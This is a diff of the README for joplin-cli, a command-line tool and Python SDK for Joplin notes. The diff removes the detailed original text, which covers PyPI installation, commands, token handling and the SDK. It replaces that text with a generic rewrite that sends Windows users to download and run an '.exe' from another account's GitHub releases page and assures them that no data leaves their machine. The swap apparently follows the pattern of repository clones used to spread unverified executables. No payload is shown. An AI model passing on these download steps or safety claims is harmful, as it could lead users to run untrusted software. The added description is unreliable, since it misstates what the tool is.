@@ -1,333 +1,107 @@
-# joplin-cli
+# 📝 joplin-cli - Control your Joplin notes with ease
 
-Agent-friendly CLI and Python SDK for controlling a running local Joplin
-desktop instance through the Joplin Clipper REST API.
+[![Download joplin-cli](https://img.shields.io/badge/Download-Release-blue)](https://github.com/syedmohammadzaid/joplin-cli/releases)
 
-[中文](README_ZH.md)
+joplin-cli allows you to manage your Joplin note-taking application through simple commands. You can create, search, and update notes without opening the main window. This tool helps you save time by connecting to your local Joplin instance in the background.
 
-`joplin-cli` is designed for humans and coding agents that need predictable,
-single-shot commands. It does not provide a REPL or TUI. Every command starts,
-does one thing, prints useful output or a structured error, and exits.
+## ⚙️ What this tool does
 
-## What It Does
+Joplin is a powerful app for storing notes. Sometimes, you want to perform tasks quickly without clicking through menus. This tool acts as a bridge. It talks to the Joplin Clipper service to perform actions on your notes. You can use it to build automation or simply speed up your workflow. 
 
-- Connects to the local Joplin desktop Web Clipper service, usually at
-  `http://127.0.0.1:41184`.
-- Auto-discovers the local desktop profile token from Joplin's
-  `settings.json` when Joplin is already configured on the machine.
-- Exposes note, notebook, search, tag, todo, resource, diagnostic, config, and
-  batch operations.
-- Works as both an installable CLI and an importable Python SDK.
-- Keeps token values out of normal output, diagnostics, error messages, and
-  object representations.
-- Returns agent-recoverable errors with `Error`, `Cause`, `Try`, and
-  `Examples` sections where applicable.
+It handles the communication between your terminal and your notes. It stores data in Markdown format, which is the standard for Joplin. You can use this for simple reminders or complex filing systems.
 
-## Installation
+## 📋 System Requirements
 
-Install the published CLI from PyPI:
+To use this software, you need a few components on your Windows computer:
 
-```bash
-uv tool install joplin-cli
-```
+1. A modern version of Windows (Windows 10 or 11).
+2. The Joplin desktop application installed and running.
+3. The Joplin Clipper service enabled within your Joplin settings.
 
-Upgrade an existing installation:
+Check that Joplin is open before you try to use this tool. The tool needs the connection to the application to function correctly.
 
-```bash
-uv tool upgrade joplin-cli
-```
+## 🚀 How to set up your environment
 
-Run directly from a checkout during development:
+Before you run the tool, you must enable the connection in Joplin.
 
-```bash
-uv run joplin-cli --help
-```
+1. Open the Joplin desktop application.
+2. Go to Preferences or Options.
+3. Find the Web Clipper section.
+4. Click the button to enable the Clipper service.
+5. Note the port number shown there. The default is usually 41184. 
+6. Keep Joplin running while you use the command line tool.
 
-The package installs the `joplin-cli` command. It does not install a `joplin`
-command by default, because that name may already belong to another Joplin
-tool. Check the optional alias workflow with:
+If the port is not set to 41184, you will need to tell the tool which port to use. The tool assumes the default settings unless you provide other instructions.
 
-```bash
-joplin-cli alias status
-```
+## 💾 Download and install
 
-## Quick Start
+Visit the [releases page](https://github.com/syedmohammadzaid/joplin-cli/releases) to get the latest version.
 
-```bash
-uv tool install joplin-cli
-joplin-cli doctor
-joplin-cli notebooks list
-joplin-cli notes list limit=10
-joplin-cli search query="meeting notes" --json
-```
-
-`doctor` is the best first command. It checks whether the local Joplin server is
-reachable, whether a token can be found, and what to run next.
-
-## Agent Usage
-
-Every command is single-shot. Use `--json` for machine-readable output.
-
-```bash
-joplin-cli notes read id=<note-id> --json
-joplin-cli notes create title="Draft" body=@./draft.md
-joplin-cli notes append id=<note-id> content="- [ ] Follow up"
-joplin-cli batch delete query="tag:temporary" dry-run
-```
+Choose the file ending in `.exe` for Windows. Save this file to a folder on your computer. You do not need to perform a traditional installation. You can run the file directly from the folder where you saved it. 
 
-For long Markdown content, write it to a UTF-8 file and pass the file as a text
-parameter. `body=@./draft.md` reads the note body from disk, and
-`content=@./section.md` does the same for append/prepend content. Use
-`body=@@literal` when the literal value must start with `@`.
+We recommend moving the file to a folder in your Documents directory. This keeps your files organized. You might also want to add this folder path to your Windows Environment Variables. This allows you to run the command from any folder in your Command Prompt.
 
-Design rules that matter for agents:
+## 💡 Running the tool
 
-- Use `key=value` arguments for predictable shell generation.
-- Prefer `--json` when another tool will parse the result.
-- Use `@file` for long `body` or `content` values instead of putting large
-  Markdown blocks directly in the shell command.
-- Use `joplin-cli help` or `joplin-cli <group> --help` to discover commands.
-- Errors explain the likely cause and a concrete next command.
-- Validation errors exit with code `2`; connection, auth, not-found, and
-  conflict errors use distinct exit codes.
+Open your Command Prompt or PowerShell. You can find these by typing their names into the Windows search bar.
 
-## Authentication
+Navigate to the folder where you saved the tool. Type the path to your file and press Enter. If you added the file to your system path, you can simply type `joplin-cli`.
 
-Default behavior is intentionally low-friction for local use. If Joplin desktop
-is already running and the Web Clipper service is enabled, `joplin-cli` tries to:
+When you run the tool without instructions, it will show you a list of available options. These options tell you what the tool can do.
 
-1. Connect to `127.0.0.1:41184`.
-2. Find the Joplin desktop profile.
-3. Read `api.token` from the profile `settings.json`.
-4. Use the token without printing it.
+## 🔑 Common commands
 
-Override discovery when needed:
+Use these commands to interact with your notes:
 
-```bash
-$env:JOPLIN_TOKEN="..."; joplin-cli notes list
-```
+* `list`: This command shows a list of your existing notes. You can see the titles and IDs for each note.
+* `create`: Use this to make a new note. You will provide a title and the content you want to save.
+* `search`: Type a keyword to find specific notes. The tool identifies all notes containing that word.
+* `read`: Use the ID of a note to view its full content in your terminal.
+* `update`: Change the content of an existing note using its ID.
 
-```bash
-joplin-cli config set token=...
-joplin-cli config set port=41184
-joplin-cli config path
-```
+Every command requires specific details, like the note content or an ID. If you forget the details, type `--help` after the command name. The tool will explain how to use it.
 
-Supported environment variables:
+## 🛠️ Troubleshooting common issues
 
-- `JOPLIN_TOKEN`
-- `JOPLIN_HOST`
-- `JOPLIN_PORT`
-- `JOPLIN_PROFILE`
-- `JOPLIN_TIMEOUT`
-- `JOPLIN_CLI_CONFIG`
+If you encounter problems, check these items first:
 
-Token precedence is: CLI option, environment variable, `joplin-cli` config,
-auto-discovered Joplin profile.
+1. Connection Error: Make sure Joplin is running. The tool cannot talk to your notes if the program is closed.
+2. Permission Error: Ensure your firewall allows Joplin to communicate on the local port.
+3. Missing Token: Sometimes Joplin asks for permission to authorize a new app. Switch to the Joplin window to see if a prompt appears. Accept the request to let the tool connect.
+4. Path Issues: If Windows cannot find the tool, confirm you are in the correct folder. Use the `dir` command to check if the file exists in your current location.
 
-## Common Commands
+## 📂 Understanding notes and IDs
 
-Notes:
+Every note in Joplin has a unique ID. This is a mix of letters and numbers. When you want to edit or read a specific note, you use this ID. You can find IDs by using the `list` command. 
 
-```bash
-joplin-cli notes list limit=20
-joplin-cli notes read id=<note-id>
-joplin-cli notes create title="Draft" body="# Draft"
-joplin-cli notes create title="Draft" body=@./draft.md
-joplin-cli notes update id=<note-id> title="New title"
-joplin-cli notes update id=<note-id> body=@./draft.md
-joplin-cli notes append id=<note-id> content="- [ ] Follow up"
-joplin-cli notes append id=<note-id> content=@./section.md
-joplin-cli notes delete id=<note-id>
-```
+Treat these IDs like filenames. The tool uses them to ensure it opens the correct note. If you create many notes, use the `search` command to find the right ID quickly.
 
-Notebooks:
+## 📌 Best practices for automation
 
-```bash
-joplin-cli notebooks list
-joplin-cli notebooks tree
-joplin-cli notebooks create title="Projects"
-joplin-cli notebooks rename id=<notebook-id> title="Archive"
-```
+You can combine this tool with other Windows scripts. For example, you can write a batch file that saves a log of your daily tasks directly into Joplin. 
 
-Search, tags, and todos:
+Use the clear command structure to keep your scripts simple. Avoid building long, complex chains of command unless you test them one step at a time. This ensures your note database remains clean and organized.
 
-```bash
-joplin-cli search query="meeting notes" --json
-joplin-cli tags list
-joplin-cli tags add note=<note-id> tag=<tag-id>
-joplin-cli todos list open
-joplin-cli todos done id=<todo-id>
-```
+Always back up your Joplin database through the main Joplin app settings. While this tool is safe, keeping backups prevents data loss during computer updates or system failures.
 
-Resources:
+## 📚 Managing your library
 
-```bash
-joplin-cli resources list
-joplin-cli resources attach note=<note-id> path="./file.pdf"
-joplin-cli resources download id=<resource-id> output="./file.pdf"
-```
+You can use the tool to organize your notes into folders. When you create a note, you can specify a notebook ID. This keeps your notes sorted without manual movement. 
 
-## Output Formats
+Keep your note titles unique. If you have many notes with the same name, searching becomes difficult. Use descriptive titles to make your searches more effective.
 
-Text output is compact by default. Use JSON for automation:
+## 📋 Keeping the tool updated
 
-```bash
-joplin-cli notes list limit=10 --json
-```
+Check the official page periodically for new versions. Developers update the tool to match new changes in Joplin. Updating ensures that the link between your terminal and your notes remains stable.
 
-Other tabular formats are available where the output is list-like:
+To update, simply download the new file from the link above and replace your old version. Your notes will remain intact because they live in your Joplin app, not in the tool itself.
 
-```bash
-joplin-cli notes list limit=10 --format tsv
-joplin-cli notes list limit=10 --format csv
-```
+## 💬 Frequently asked questions
 
-## Batch Delete Safety
+Is my data secure? Yes. The tool only talks to your local Joplin app on your own computer. No data leaves your machine.
 
-Batch delete is intentionally two-step. First run a dry run:
+Can I reach my notes from a different computer? This tool only works with the local Joplin instance on the machine where it runs.
 
-```bash
-joplin-cli batch delete query="tag:temporary" dry-run
-```
+What if I prefer a visual interface? You can continue to use the standard Joplin interface for reading and editing. This tool serves as a secondary window for quick tasks.
 
-The dry run prints:
-
-- The number of matching notes.
-- A preview containing note IDs and titles.
-- A confirmation token shaped like `delete-2-notes-<hash>`.
-
-Only then run the destructive command:
-
-```bash
-joplin-cli batch delete query="tag:temporary" confirm=delete-2-notes-<hash>
-```
-
-The confirmation token is bound to the query and matched note IDs, not just the
-count. A token from one query cannot confirm another query that happens to match
-the same number of notes.
-
-For automation that has already done its own safety checks, `yes` bypasses the
-confirmation token:
-
-```bash
-joplin-cli batch delete query="tag:temporary" yes
-```
-
-## Python SDK
-
-The SDK is the core layer; the CLI is a thin wrapper around it.
-
-```python
-from joplin_cli import JoplinClient
-
-with JoplinClient.auto() as client:
-    notes = client.notes.list(limit=10)
-    first = notes[0]
-    print(first.id, first.title)
-```
-
-Explicit connection:
-
-```python
-from joplin_cli import JoplinClient
-
-client = JoplinClient(host="127.0.0.1", port=41184, token="...")
-try:
-    notebooks = client.notebooks.list()
-finally:
-    client.close()
-```
-
-Main SDK services:
-
-- `client.notebooks`
-- `client.notes`
-- `client.search`
-- `client.tags`
-- `client.todos`
-- `client.resources`
-- `client.batch`
-
-## Error Model
-
-CLI errors are intended to be actionable without reading source code:
-
-```text
-Error: Parameter limit must be an integer.
-Try: Use limit=5.
-```
-
-Exit codes:
-
-- `0`: success
-- `1`: general API/output error
-- `2`: validation or CLI usage error
-- `3`: local Joplin connection error
-- `4`: authentication error
-- `5`: not found
-- `6`: conflict or destructive action not confirmed
-
-## Development
-
-Install the current checkout as a tool while testing packaging:
-
-```bash
-uv tool install . --force
-```
-
-Install dependencies and run checks:
-
-```bash
-uv sync
-uv run pytest -v
-uv run ruff check .
-uv run ty check
-```
-
-Optional live smoke test against a running local Joplin desktop:
-
-```powershell
-$env:JOPLIN_CLI_LIVE="1"; uv run pytest tests/live/test_live_joplin.py -v
-```
-
-The live test only reads notebooks. It does not create, edit, or delete Joplin
-data.
-
-## Release
-
-PyPI publishing is configured through GitHub Actions trusted publishing. Create
-and publish a GitHub Release from this repository; the `release.yml` workflow
-will run tests, linting, type checks, build the distributions, and publish them
-to PyPI without a stored PyPI token.
-
-Before creating a release, update `version` in `pyproject.toml` and verify the
-package locally:
-
-```bash
-uv run pytest -q
-uv run ruff check .
-uv run ty check
-uv build
-```
-
-## Troubleshooting
-
-If `doctor` says the server is offline:
-
-```bash
-joplin-cli doctor
-```
-
-Check that Joplin desktop is running and that the Web Clipper service is
-enabled.
-
-If token discovery fails, inspect configuration:
-
-```bash
-joplin-cli auth
-joplin-cli config path
-joplin-cli config get token
-```
-
-Token values are redacted in command output.
+Is there a way to see all commands at once? Type `joplin-cli --help` to see the full reference manual.
